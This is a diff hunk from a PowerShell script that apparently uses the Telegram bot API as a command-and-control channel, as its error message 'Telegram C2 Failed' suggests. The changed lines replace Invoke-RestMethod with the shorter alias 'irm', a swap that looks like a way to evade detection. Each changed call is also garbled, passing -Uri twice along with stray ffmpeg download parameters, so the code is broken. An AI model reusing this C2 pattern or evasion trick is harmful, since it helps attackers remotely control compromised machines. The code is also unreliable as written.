@@ -612,13 +612,13 @@ param($Messagetext,$ChatID)
 $FixedText=CleanString -Stream $Messagetext
 $Mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
 $JsonData=($Mts | ConvertTo-Json)
-Invoke-RestMethod -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
+irm -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
 $catcher = $FixedText
 }
 
 Function ReceiveMSG{
 try{
-    $inMessage=Invoke-RestMethod -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
+    $inMessage=irm -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
     }
 Catch{return "Telegram C2 Failed"}
